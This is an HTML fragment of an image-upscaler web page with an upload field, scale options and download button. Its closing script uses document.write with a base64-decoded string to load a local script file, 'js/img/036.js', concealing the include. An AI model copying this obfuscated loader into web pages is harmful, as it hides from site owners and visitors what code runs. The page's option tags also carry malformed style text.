  ...
  <div class="toolarea">
    <div id="container">
      <div id="inputContainer">
        ...
        <center>
          <input type="file" id="inputImage" accept="image/*" onchange="displayUploadProgress()">
        </center>
      </div>
      ...
      <center>
        <label for="scaleFactor">Choose upscale factor:</label>
        <select id="scaleFactor">
          <option value="2" color: #fff;>2x</option>
          <option value="4" color: #fff;>4x</option>
          <option value="6" color: #fff;>6x</option>
        </select>
      </center>
      <center>
        <button id="upscaleButton" onclick="upscaleImage()">Upscale</button>
      </center>
      <img class="outputingg" id="output">
      <a id="downloadLink" download="upscaled_image.png">
        <center>
          <button id="downloadButton">Download Upscaled Image</button>
        </center>
      </a>
    </div>
    <script>
      document.write(atob("IDxzY3JpcHQgc3JjPSJqcy9pbWcvMDM2LmpzIiBkZWZlcj0iIj48L3NjcmlwdD4="));
    </script>
